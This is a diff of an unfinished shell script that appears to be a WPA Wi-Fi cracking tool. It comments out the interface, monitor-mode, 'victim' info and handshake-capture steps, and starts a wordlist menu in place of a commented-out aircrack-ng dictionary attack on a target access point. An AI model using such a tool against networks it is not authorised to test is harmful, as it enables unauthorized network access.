@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 #------------------------#
 # Created by Arvin Itaas
 # Website:
@@ -128,7 +128,12 @@ wpa_handshake() {
 # Attempts to crack WPA key using WPA handshake through public wordlists
 wordlist_crack() {
 
-	x-terminal-emulator -e "aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/psk*.cap"
+	# Display wordlists found in wordlists/ to attacker
+	cd wordlists
+	WORDLISTS=(*)
+
+	#for loops n shit
+	#x-terminal-emulator -e "aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/psk*.cap"
 
 }
 
@@ -136,9 +141,11 @@ wordlist_crack() {
 #	MAIN EXECUTION		#
 #-------------------------------#
 
-obtain_interface
-monitor_mode
-obtain_victim_info
-obtain_channel
-wpa_handshake
+#obtain_interface
+#monitor_mode
+#obtain_victim_info
+#obtain_channel
+	#HAVE IT DELETE DUMPFILES IN DUMP FOLDER AFTER CHANNEL IS FOUND
+	#PROMPT USER TO ENTER VALID NON-TAKEN NAME FOR PSK FILES
+#wpa_handshake
 wordlist_crack
